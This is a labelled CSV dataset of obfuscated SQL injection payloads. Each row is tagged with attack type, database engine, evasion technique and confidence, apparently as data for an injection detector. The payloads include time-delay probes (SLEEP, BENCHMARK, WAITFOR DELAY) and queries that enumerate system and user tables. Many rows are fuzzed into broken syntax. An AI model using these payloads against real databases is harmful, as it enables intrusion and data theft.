payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1' /*((SElEcT (SeleCt (selEct (SeLEct (select (seLect (SElECT (sElECT 3))))))))*/) +aS+rqfq wherE (selEct 0x1BA5)/**/ LiKe 2X1ba0B11 Or (SelEcT (sELecT (SElECt 0x949))) likE ( SelEct COUnT ( * )& fRoM rdb$fIeldS aS T0b1,RDb$TyPeS aS T0b14,rDB$CollationS aS/*dIz`u geN*/T7,RDB$FuNCtiOns AS t6 () ANd 'oy' noT like 'OYQ' --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_single_quote
"5' ) /**/) ) ||(seLeCt 0x0x8B0b1011101001001000011110111111010000000) Like bEnChMArk ( (SElect 0b10011000100110110011100),Md5 ( 0x0b0b11000010a4745 ) ) & aND ( ; ( ( 'tPeO' lIkE 'TPEO",time_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"0X0B1' OR `/(# SeleCt 'kUXP' WhErE""0O2b11110136601011 = 0x1bd0b11~aNd 0b11010011000/**/ LiKE (SELECT (SELECT 0b0b10000000000011101000111011010100110011000))@OR "" &s""!="" &s"" <Or ""OPt4""/*0x6uvuS*/Like ""Opt0o4#""#R^Ey}m;",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_single_quote
"3x4%"" <) oR 0O00302=%= bEnchmarK* ( (sELeCt 0X5B8D0o120),Md5% ( 0X0b0o7347050240d0b101A3C ) %+) `and[4x0B9x1+ anD true/**L+L! <vK(K% k]8""fa*/ oR !FaLSE Or]'.' noT+lIke '.' or\(SeLEcT (seLECt (SeLect (SeLect 0X0b10110111101)))) <> (sELect (Select (sEleCt (sElEct (selECT (SELECT 1225)))))) AnD (sElecT 2496) <> 0X24c9 oR ';tN'?noT LIke ';tn' AND 0x1 Or faLsE && trUe.aND tRue || falsE OR False#GE])Z-A;nLSE~ks",unknown,unknown,case_variation|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"0B1'/*(SEleCT (seLecT 0x0))5i*/ ) ) )' AND ! !(+|SeLECt 0B0x238b fROM ( SelECT,COuNt? ( *, )^ ,cOncAt (""!6X0O10225475a0o121, ( seLeCT_ ( <eLt ( 0O0O9x986B <lIKe ; 0X232b,(SElecT (SELecT 0o0x0o0o1o1))/ ) ) * ) ,0X9x2cda0O1420a6x6B4X0B114f,FlO OR ; ( R AnD ; (> (SElecT 3o0x3) ) *0o2& ) : )^: x From inforMaTIOn_SchEma.ChaRACTEr_SETs gRoUP bY x; ) a; ) && ( ( *( ^'DSOk'{ LIKE 'dsOk",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_single_quote
"1o6'+ ( SelEcT(lLCL'WhEre@0O2x0o130C like+}0B5B6x1Ffc ANd ""(SElECt (sELECT/*m)! v<o:E8f[zkPclvG^8"";{TrsH+K4tVp= CA*/(sELeCt 0O2xa9c))) Like_ ( }seLEct coUnt; ( *< ) FROM SysUSErs OR fALSe oR ""Mi""!=""mi"" && ""JBA or FALSe aND 3X143F<>(SEleCt (seLect 0o12100)) oR False or 1x0 OR False#""!=""jbA#!""#aS!sYS9,SySuSeRs{As sYs8,sySUSErS as SyS0b10,sysusErs as;sys0o0o0B100,sySuSeRS as syS0,SYsUSErS aS sys0b10,sysUSErs as sys6O7_}) and'' QE;s'}lIke&' QE;S' ANd trUE && \(SeLeCT (seLEct 0x0)) OR FAlSe oR;} falSe or "">G{"" NOt*likE "">G{"" && ''7' NoT LiKE""'18' oR 0x0o5xB33\Not lIKe 0XB93 Or fAlsE Or }(SELect (SElEcT 0x1)) Or fALSE&&TRuE%or ""m"" lIke ""mF"" oR faLsE'-- Zo[:Irz~<z:)",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"9%"" ) ) } wAitfOr DELaY '0:5o0o0O6x2x0B111:5'` && +/**TI?((BUT3TW]/(sElEct (SELECT (SELECT (SELECT (SELECT 6)))))*/ (/*A`2PO*/ ( . ""%""^ lIKE """,time_blind,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"0X1 ) ) As aMyr WheRe 0o0B104103111011 lIKe (SELECT (SeLeCt (SElECt (sELect (sElect<(SElEct 0x1c07))))))^ oR chAr (% 0b1110111 ) OR CHAr ( *(SeLEcT 0O0o220) ) Or chAR ( (SELeCt (seLecT 0x63))| ) oR CHAr* ( (SElecT*(seLECt 0B1111001))@ ) -= rEGexp_sUbStRinG ( REPEAT ( or (selEct 0) Or fAlSE OR 0B0x597 Not LIke (selEct (SELECT 1431)) aNd TrUE#rIgHt ( cHar ( 0B0o0O3151 ) ,0o0/*0b11B~gO)?%<V. +}a_d+mV?9tO^FLc=iXh*/ ) ,(sElect 5x218AE2A2e) ) "",NulL /*yohd*/) && TRUE` oR{ FaLsE aNd}""h 00"" noT LIKE ""H 61k"" or 'E' NOT LIKE 'E' oR FAlSe Or FalSe Or ""l"" <> ""L"" oR ""b"" LIkE ""B]"" oR FaLsE anD trUE or '^' NOT)= '^' AnD tRuE Or""fAlsE Or (selECT (SeLECt (SeLECt 0x0))) --c;8",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0o0O0b110B0x1%' + )/*Z!;:(SEleCT (sEleCt (sELECt (SelEct (seleCT (seLECt (seLecT (SELECT 0))))))))J+or falSE or FalsE Or FalsE or fAlSe && True OR (SELECT 0) && True# )O>;1(*/ ]) ` { . OR 8X1O7x44C8_= LiKe; ( 'AbCdEfG',uPPEr}%(* heX ( raNDoMbLOb {( {0b1o6B0o4o0B0x5X3o0B0X7O7DcD0o13739/0B7b0b1001O3b1Xa ) ]` )> )/ ) ~ && ] ` (&.; ( '%' .lIkE ' @bn\~'>0x1?2",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"2""/**/ OR (SelECT 0x0B110110CD)= ( sEleCt CoUnt ( * ) FrOM;genERaTe_SerIes \( (sELEct 1),0x4C62B0] )'/ )& +and` ""Ncym""[LiKE ""NCYm",unknown,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.06,rule,sqliv5_json,unknown
"0X0B0o1'.,) Or cHar ( (seLeCT (SELecT (SeLeCT (SELEct 7x77)))) ): oR CHaR ( (sElECt 0B9x0b0xaCd0o36) ) \?OR ~chAr (: 2x0B150x98 )' { Or cHAR ( 0o146/ )/*}z7FDU]1f}z 3P;.*/ lIKE REGExp_SubStRInG ( RepeaT ( leFT ( _CrYpt_key (= CHaR ( 0B0X0o0o0o3F *) Or ChAR +( (SeLEcT 0X45) ) or@ CHar ( (SelECT (SeleCt (SelECt 0x53)))& ) ,NULL$ ) ,(SELEcT (seLEct (sEleCT (SELECT (SeLEcT (SEleCT 0X0)))))) ) ,0X0O3263262400 ) ,Null ) ; && ( 'ozEF' ?likE 'OZef",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0o1"" &oR fAlSE Or fAlse or ""ZLw""<>""ZLW"" OR (SELeCt 0) OR False#~) ;_ )$ ) < oR [(sEleCT:(SeLeCt 0o0B0o0b0O0x10A7))= ( Select COUnt (! w&=!p""w|* ) frOM:All_uSErS T0B0b3O0b7,aLl_useRS]t3,All_USERS}t0B0X3,all_UsErs T4,ALL_USErs t0B107 ) / :aND . ( ( /*l;u~tm^:W?(sELEcT 0X1)|BO?(seLECt (SeLect (SELeCT 0b0x8))):ot6TZX %PQ*/> ( ""WvLB"" liKe ""wvLBohrFhY d",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"1' oR chAr ( (SELECt 0X0X75) ) Or ChaR ( (SElect (sEleCt (seLEct (SELEcT (seLecT (sElect (Select (SELECT (SELECT 111))))))))) )} OR cHAr ( 9B311X0X45 ) OR ChAR ( (SeLeCT 0x64)' ) liKe REgExp_SUbsTRinG ( REpEAt. ( lEFt ( Crypt_Key ( cHaR ( 0x41> ) OR >cHAR ]( (SELECT 0b0O0X42) ) ||chaR ( (sELECt (SELEcT (seleCT 0X53))) ) ,nuLL )~ ,0x0! ) ,0X2Dcd8940 ) ],NuLl )+ AND; 'AdSH' LIkE 'ADSH",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"0o5' IN bOoLEaN MODE )*:^ oR `UPDATEXml~ ( +6X70B,cONCat/*5Sa,acyA+ToaQ*/ ( 9X0E,0X7171306a71, ( SElECt (/**/ eLt ( 0X0x0O0x0B1013000110 =+ (seLEcT (SelEcT (seleCt (SELEct 0x710)))),(seleCt (SeLECt (SeLEct (SelECt 0o4)))) |) @) ; ) ,0X0b0O7420523251a867a31 ) ,(sEleCT 0X21Da) ) Or ""f."" NOt LIke ""F."" oR fAlSe ANd (sEleCt (SELECT (SELECT 1)))!And 0X9 or FALSE && TrUE anD 1 or FALSE#N)z@S",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0o3' +aNd ""!_"" NoT LIKE ""!_r"" oR""FaLse AND ' ""u V' like ' ""u v'=OR FALse AND TRuE:Or ""=r"" nOT Like ""=R"" or$""q""<>""Q"" Or (SeLEct!(sElECT (sElECT_(SeLecT (SElecT (SelEcT (seLecT (select (SeleCt (SElECt (SELEct (sELeCT (sElECT (SELECT 0)))))))))))))) Or fAlse_&& ""{""<>""{o"" OR 8x0 anD ""0o4v""=""4v"" or fAlse{Or (sEleCt 4X0) or FaLSE anD tRuE or faLSE or 0#) & anD$7x0O0X0X0X6dE = :( seLecT cOuNT $( >* )/*<kw*/~ fRom rDb$FieLds AS t8,RDb$TYPes As T0O3,rdb$cOLlATiOnS As t0X8b0o145,rDB$FUncTIONS As#t0O9B0 ) /**/ AND % ( 'gCnA' =['Gcna(6li2O3]?Ws/p-JpQ]@IN",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"6x1' )) ) oRDer By:9x0X0b1 oR 0X1EA nOt Like 0X1Ea! or 0b0X0 And 0X8e2=1X1E2 aND (SelecT (SelECT (selECt (SELECT (SELECT (SELECT 1)))))) oR falSe ANd True&Or ""t"" NOT liKE ""t"" oR false AND True#{oT> hYS?,",unknown,unknown,case_variation|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"SelEcT ( CASE whEN~ ( 0B2B0b1101000011001001011011010111101001110000111101111100100100101111101100010000001101000110001001010011110100111100111110100101111100+= 0X898 ) tHEN:(sEleCt (SELect 0x1)) eLse (SeLeCt (SeLect 0x1752))*? (/*0b111X6/;|'M@&)zk0o2YbTyHHL8""IaG+f*/ sELect (sELECT (sElECt (sELect 5972))) FRoM MASTEr..SysdatAbASes ) /**/ eND )@ OR FAlsE.oR False OR (SElecT (SELEct (SELECT 7889))) noT LiKE (sELeCt 0O17321) OR fAlse oR ""wx(0o6"" nOt liKE ""wx(6"" OR FalsE --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"8O0O5x0'% )/*|zz:XaW*/ OR 0x0b11x0X0X0O0O0d2X0b0B3O0O0Xbf {LiKE/ ( oR (SeLecT (SeLEct (SELECt 0X0O8X2378)));NoT lIKe<(SELect?0X2371)# or FALSe and[trUE aND,(sELEct (SEleCT (SELEcT`(SelECT 0X1)))); OR FaLSE aND$TRuE or ""G"" NOT likE ""G"" OR ""Bo""=""bOG"" OR FALSe#/*tT)(bcuH,sPcee]vo=*/SElEcT@CounT ( *|+) (fRoM.RDb$FieLDs AS t0x0x0B0X0B1010,RdB$TypEs/as)T9X9,rDB$coLlATIOnS=As,T0o0O0B0o4B0o0o1,RdB$fUNCtIONS)AS_t4 ;) |)ANd. ;( |'IQVg'='IqVg[m?0X3%.;yjB_xLh.r;@",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"0b210' oR 0B0b100O0B5x3a83 ;$`LIKE:/*&AUnp< K:t4DD(Gr Li*/ [ , >( select,0x6x0x1A0O10F\fRoM PG_Sleep} ( (SElEct 0x6)!^ ) ?)&; ANd+'UKOC' lIKE 'UkOc",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"0B0' ) ) ! OR (SelEcT/1x1cf2) LIKe & ( seleCt%cOuNt ( * ) ] from sysIBM.SyStABles/**/AS+T0x1,SySibm.SysTaBLeS As T3,sYsIbM.SystaBLeS As T0B0b1010 ) anD `!(SElEcT 0X6)}oR (SeLeCt (SeLect 9x8)) And/*Kc;5M 0X5)7bi*/true && tRuE OR 'Eoa' Not lIke 'eOa' Or:&fAlSe aNd:(SELECT 8Xa05) NoT LikE (sElecT 0X8Da) aNd TrUE anD=TRue Or FaLSe Or faLsE oR faLse Or 1X5X0 AnD tRUe or fALse and truE --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"4X1' ;) + )+ AS\yqCL WherE((SELecT (seleCt 0X0o15a2)) lIKE!3X0B1501A2 RliKE ( seLeCt * FroM( ( selEct ( SLEEp ( ~(sELeCT 6X2) /*L*/ ) ?) * @ ) SGVO ) -OR 0O0x0X05A/*ffo^ */nOT LIKE}8X0x85A OR~""6H5"" nOT+ LIke ""3H5"" ^or (SELect 0x0)-aNd tRUe< && @TruEaNdTruE ANd (seLect (SelEct (sElecT (sELect (SELECT 1))))) --",unknown,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.05,rule,sqliv5_json,unknown
"1"" /*S*/)` ) ) ^ && (sEleCt 0X1E0O0b0o7B1100111c) =�Ms_UTIlITy.SQlID_tO_SQLhAsH"" ( ( chr ( (SeLecT 0b1b2110111) ) Or Chr (&&0xc8 ) OR chr/**/ ( 4x70 ) or CHr (< (seLeCT (SElEcT (selECt (sElEct (sELECt 0B0x0O4146311))))) ) || chr ( 0x41 ) || (/ sElecT ( caSE wHEn ( (seLEcT (seLECT (selECT (SELect 0x1e4C)))) liKe *(SeLeCT (sElECt (SeLeCT 0O4x1e4C))) ) ThEn 0O0x4?Else 0x0 end' ) FROM Dual ) ; Or chR ( ](seleCT (sElEct 0x19D)) ) >or cHR (` 0O0o254 ) or ChR ( 0X46 ) OR cHR ( 2x7a ) ||chR< ( (seLECT (sELecT (sELect (seLect (sElEcT (sELect (selEcT (SELeCt (SelECt (seLECT 0XB7)))))))))) ) ) ( ) anD (@ /*U{(ezyCnyImRFM;$?;%w*/*( )/( ""fRGB"" LIke ""FrGB",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.06,rule,sqliv5_json,unknown
"1""[ ) ) as TFJH WherE!0o4O2129 LIke; (select (SelEcT<1134))=And 0o20675 = ( SelECt COUNt @( @* ) ] froM genERaTE_SeRIeS ( 0O0O4X1,(SeLECt 0B0B111B50011111101011081010001000111111100111110101111110900111010001100100110010) /) | ()\ and((seLeCT (SeLeCT 0o0b11101010101100))*nOt lIkE (selECt 0b1101070010001) And tRUe AND True#OR ""8"" LiKe ""8F"" or 0x0 OR "" "" lIKe "" m"" or@(seLeCt 0xDa9)/**/LIkE 0xF0b0b1111101001E AnD 0o0b10011101111 nOT lIke 0b1010110100 and (SeLecT (SEleCt 1)) or;0X0 && truE and trUE --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"0X1%"" ) )/ OR 0x0x0B0b0B0b0b110000101011111100010010100011101000000100111111000101010011000100010010011001010011100111001011011010110101110100001110 LIKe BeNCHmark ( /0X56f9a0,md5 ;( 7x0O1040d0B4o151a4C ) /*kSA*<*/ ) oR (SELecT (SEleCt\(sELEct_(sELEcT 0X21F2)))) nOt!in (0x0x23F1,(seLEct (SELECt (seLect (SELEcT 0x23F2)))),0b0x28f3) AnD True oR 'Z' likE 'zP' or 0x0 OR FaLSE oR FALse ANd trUe oR 0X0 &&? truE#YvG2 =&#ukY",time_blind,mysql,case_variation|inline_comment|function_alternative|hex_string,0.4,rule,sqliv5_json,in_clause
"0X8' ()/* |Wa*/ ` /*;A@P.\(C~pH{eU^G*/ <or / <[4X0o4X0B0b0B0b1010x3D0b1010950= ( ~SelEcT counT >( *+ )[)`fROM RDb$fielDS+aS/T0B0O0x0x0b111O0x7B1,rdb$TYPEs+as T5X6,RDb$COllatIOnS}aS_t0x0o0x0B1X4,RDB$funCTIOnS/*(select (SeLECt aND ""d"" NoT Like ""Dx""!AnD (seLeCt~(SeleCt (SElect 1))) OR 2687<>(SELECT 2687) OR False#(seLeCt{(SeLEcT/*Wd ;(selEcT;(sElect 36))@@*/(SeLect (selecT?0B1))))))*/AS T9b0B0x6O4X0B5O0x0x54 )< g)aH",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
0b0X4o0b0x0o187'$`/*;VUx*/)$. )~/*(SElect:(SeleCT?(SELEcT>0B0x8))) y!0B110x8*/;)and SLEEp@\(@<0x0O7x0x1o0o2x0b102 `)( &aNd _(^$ ( %:'jiio'`like 'jiIo,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"1"" ) ) aNd ( [SeLEcT (selECT (seLECT 0X2))* ( if ( ( SelEcT * fROm ( seleCt cOnCaT ( 0X7171706A72, ( selEcT (/*y~R&sNV*/ eLt ( 0Xd0O11c LiKE (selECt (SelECT (SELECT (SELECT 3484)))),0X1 ) ) ; ) [,0X3x2cda767A71,0X58 ) ) s ) , (SeLEcT 0x0o73643dCFb7617fffa),_(SELECt (SElEct (SeLecT 0x1538dcFB787a55fA))) ) ) ) And ( ( ""rqXD"" likE ""rQXD",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0O0x1""} )'/ AS idwA wHere/0X98D LiKE (SELECT 0B0X6eC){oR 6b0o5B0b10000409001115111001211106090110141011110 = ( SElecT cOUnT /**/( * ) '@fRoM rdB$fiElds As t1,rDb$tYpEs As(T3,RDb$COLlaTiOns As T3,Rdb$fUnctiONs|as!T2 +) }Or/*k.)*/'\Fj'{not%~=/*a>\(SELecT (sELECT (SelEct (select (SElECt (sElECt (SeLeCT (sEleCT (sElEcT (SELECt (SeLECt (seLeCt (SELECT 8)))))))))))))?b!V hF8aEGR*/ '\fj' AnD TrUe or\'brG' not liKe 'BRg'{ Or 5O0o0O0xcaF/*6jt)!c3*/liKe (SELeCt 0O6222) and TRUe AnD trUe Or?0b0X0 Or 0X0;ANd>(SelecT (seleCT (seLEct 0x0o1))) AND 0B2o0o1 Or '1o2Czt'!LIkE '2cZtt' oR faLSE && TRUE oR!fALsE aNd tRue And 0X1 and)""`z"" not likE ""`zr"" ANd (SELECT 1) or False or fALSE oR FALSE --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"2O4o2'.rlike ; ( Select (,]CasE wHen~ (> 0B101x8e7x4 ;{ lIKe ' (SElEct (SelECt 0o0x1e08))) ) ? tHEn/6x0O0x0O1 else}0X6X18 ENd! -) / ) &&'Xnap'/*gty*/ ?likE ?'xNaP",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0b1"" && 0O7203 In ( ( ChaR ( (sELEcT 0x9x75) {) +CHar ( 113 |) +CHAR (^ 0x0X0b1010180 ) +Char ( 0X6A ) +Char ( (SElect (SELECT 213)) ) + ( seleCt ( caSe WHEN ( (selECT*(SelEct (seleCt (sELeCt 0Xf4E)))) lIKE 3715 ) "" thEN ChAr ( 0X31 ) ELse cHAr\ ( (SEleCt (SeLEcT (SELect (SElEct 0b110000)))) ) eNd ) ) +Char ( (SeleCt 0xBA) ) +chAr ( _0o0B4x2X5A ) +Char ( (SeLeCT (seLecT 0o1455)) ) +cHAR ( 0x7A ) +CHAr ?( 112^ Or (SeLect 0X0) Or fALSe or FaLsE or faLSE or+ falsE/or (SELecT 0) oR FaLSe aNd True AnD (SeLeCT (SELECT 1)) OR False#) ; )^ ) &&""BZZt""]lIkE ""BZZt u& z]r'jusPD0B106VDmY",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,in_clause
"1"" Or`0x0x0B0B0b10011101170100Ea=bENcHMarK (`)(SeLECT (seLecT (sElEct 0x4C4b0B0b11000101010001000))),MD5 ( )1b0x5X2b6A0B0B10001002071011/*|<Pmt_G*/ +)$_ &) $` &&]""VnEI"" likE ""vneI",time_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
":SEleCt sLEEp|;( (sElEct>0x7b0B0o8O0b1001X4) &)/*{(SelECT (SELECT 7x0))YkP*/ $and *!( ""zSJW"" LIkE ""zSjW",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0'^ {) |)@ * && ExP% (+ ~ ( SELEct * FRoM?. ( SELecT cOncAT ^( 0X7112201a71, ( ;SeleCt (] Elt_ (/ 1B0x4x8be5x8b0o9O3o352* lIKE 2O0X0fFe,0O5x8 ) : )? [~ ) ~,0X715A0O0o2547A0x0b0O25,0o0X88 )/*V;;{!+lF K$r*SeQHiz~>*/ ; ) x ){ < )/ _* aNd, ; < ( +( 'VcPH' `LikE 'VCPH",unknown,unknown,case_variation|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"9o1' OR), (>(SeLEcT 'ZiFu' From dual wHERE 0B8x4xCd6=(SelECT 6x1e1E) or 0X3fE$ lIke/ _]( sELeCt=COUNt/*H\!&jyc(\egLOAMfj*/ (;,*= ) ;fROm All_USErS`t2,aLL_usErS t0o6,ALl_USerS@t3,ALl_UseRs:t2x5B0b100,aLl_uSERS T9 ^) and TRUe and (sELeCt 0X0X0O1)_ ANd ""3 "" NoT liKe ""9o0 I"" $or) FaLSE or FALSe AnD TRUE oR faLSE oR FAlSE And ' ' NoT lIKE ' +' Or>FaLSe AnD (sELEct (seLeCT 0O8x1)) or fAlSE OR (sELECT 0X0b0) OR ""A"" Not Like ""A"" ANd truE Or (SeLECT 0x0) Or 0XEDf!=(sEleCt 0X3XEdf),oR ""w7""<>""W5"",Or fAlsE?--",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.06,rule,sqliv5_json,string_single_quote
"6' )`}, )} |) oR CHAR (; (seLect 8x0o0O54) ) OR ChAr} ( (SElEcT 2o7O6x15) ) Or cHAR$ ( 4X3x6X0X8D ) ~ or chaR% ( ?0X1O11X55 >) liKe ReGExp_SUbstriNg ]( RePEAt ( rigHT (\ ChAR}^( 6x3507 ) ,(sELEct (seLecT (seLEct (sElecT (sElect 0O0o0))))) ) ~,(seLeCT 0x0X15faAdb0) ) ,NuLl; ) anD ~( ( ( 'jhlE'}lIke 'jhLE",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,unknown
"1' ) /*|p D6t^*/ And (sElECt 4241)=CONveRt ( iNt, ( SeLecT>CHaR? (| 0X67 ) +cHar (* (SeLecT (SELECT 113)) ) +cHaR; ( .8x0o106 ) +char ( (sElEcT (sElEct (SELecT (SEleCT 0X6A)))) "") +ChaR {( (seLeCt (sELEct (sELect 113))) ) + ( SELECt ( caSe WheN ( .(SELeCt 0x1098)=0x0O0o0X3fd ) /ThEn chaR ( (SelecT 0x0b11b) ) ELse chaR ( (SeleCT 0X7x30) ) ENd ) ) +ChaR ( (SElECt 640) ) +chAr (] 5X7a ) /+ChAR ( (sELecT (seLEcT (selECT (SELECT 118)))) ) +CHAR ( 0o0x0O7A ) +chAR ( <(seLECt (SELECT 053)) ) )[ ) And ( 'RSPZ'$ lIKE 'RspZ",error_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"9%"" ) anD ~( selECt (SeLECt 0O2)*</**/( \IF ( ( ! selECT * FROM ( SELEct conCAT ( 0X0x0X11f482A71, ( sELECT ( Elt'/**/(/**/ (seLect (sEleCT (SELECT (SeLEct (selECt (SELecT (SElECT (SELEcT (SELECT 3384))))))))) likE 8x895,(SeLeCT (sEleCt (SELECT (SELeCt 0x9)))) ) ) )( ,0O0B0X0O331a767A71,0x0x0B1X0X4E )- ) S ) , (seLECT (sElect 0X7538dCfb4317fFFa)), 0X7538DcfB7637fFFA ) ) } ) && ( ""%"" /**/Like """,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"7%' $or &(SELeCt_(seLect 0O0O0x0b0x0a0150B))+= ( sELECT{CouNt_ ( * }) +;from(sySUSErS""aS(sYS8,sYsUSerS as|sYs0,SYSUSeRS as sys3,SySuseRs*aS Sys1X4,SysUseRs aS sYS0x6,SYSUSErS aS sys9o8,sySuSeRS AS SYs0x0B101 ) ~ And '%' /*Z""Su Or FaLse anD (SELect (selECT (selecT (selEct`(seleCt (SeLect&0x0))))))~OR 0o0X1'Or>0b2~Or falSe && True||'W'='wC'&oR*""}p"" noT liKe'""}P"" or faLse aNd+(sELecT (SElECt (SElECt 0X1))) OR%(SELecT (seLECt 0x3689))=(seLEcT (sELEcT 0X168A)) Or ""To""=""ToE"" or fAlSe && TrUe Or (sElECt (SELECT 0))#i BChihvmlYX0U*/LIke ']u3Gyffnh",boolean_blind,unknown,case_variation|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"0b1001' oR < ( Select 'setd' frOm DUAL wherE 0b111015100110 |=/ (sEleCT (SELeCt (selECT 3686))) ( sElEct` (& CaSe when ( /**/""`"" :NOt lIKE ""`b"" ) =thEN_reGEXP_SubstRiNg ( rePeaT ([ rIgHT ( cHAR }( 6B1010101101011[ ) ,0x0 ) ,(SEleCT 0x1f0o0o3436020) }) ,nuLL ) ELsE Char ( (SelECt (SelEcT 0X6c)) +) oR CHar ( 2X10 ), or chAR"" ( (SeLect (SELect 0x262)) ) oR CHaR ( (Select (SElECT (seLecT (sELEct (seLect (seLeCt (SELECT 116))))))) )& eND ) FrOM INForMAtioN_scHema.SystEM_UsERs ) ) OR '",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.06,rule,sqliv5_json,unknown
"5x0X5' IN]Boolean MoDE ?)# OR:CHaR '(_ (SElEcT (SelEct (SelECt 75))) ) oR char /*z}*WIQ*/(<}2x0B0B0o144E ) OR cHar ( 0o0X22+|)- or chAR ( 0O120 )/*Ff*/ =REgExP_SubSTrIng> ( rEPeAt ( LEFT ( cRyPt_kEy ( ChaR+ ( (seLEct 0X15) ) [ oR char (+""9X41 ) oR, CHAR ( (sElEct 0O0x23) ). ,NUll>{) >,(sElECt 0x0) )` ,(sEleCT (SeLecT (SELEct 588017000))) ) ^,nuLl ) &or/*j2vp;*/faLsE oR FALSE anD_true/**/or fALSE or (SeLecT (SeleCt (SeleCT (selEcT 0x0)))) Or}(seleCt 0X0) oR FAlsE aND ""us"" NOT LiKE ""usK"" And tRue AND true Or (sELecT (SeleCT 0)):--N\",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
